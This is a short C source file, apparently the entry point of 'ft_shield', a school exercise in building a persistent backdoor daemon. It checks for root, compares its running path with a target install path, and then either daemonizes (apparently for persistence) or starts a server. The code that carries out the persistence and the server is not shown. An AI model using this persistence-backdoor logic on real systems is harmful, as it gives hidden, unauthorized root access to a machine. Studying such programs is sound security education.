#include "../includes/ft_shield.h"


int main(void) {
    char current_path[256];

    // checks that the program is launched with root rights
    if (setuid(0) != 0) {
        return (EXIT_FAILURE);
    }

    // get the current path of running program
    if (readlink(PROC_SELF_EXE, current_path, 256) < 0)
		return (EXIT_SUCCESS);

    // if the program is not running by persistance, daemonize it
    if (strcmp(current_path, TARGET_PATH) != 0)
        daemonize_program();        
    else 
        // if yes, run the server
        run_server();

    return (EXIT_SUCCESS);
}
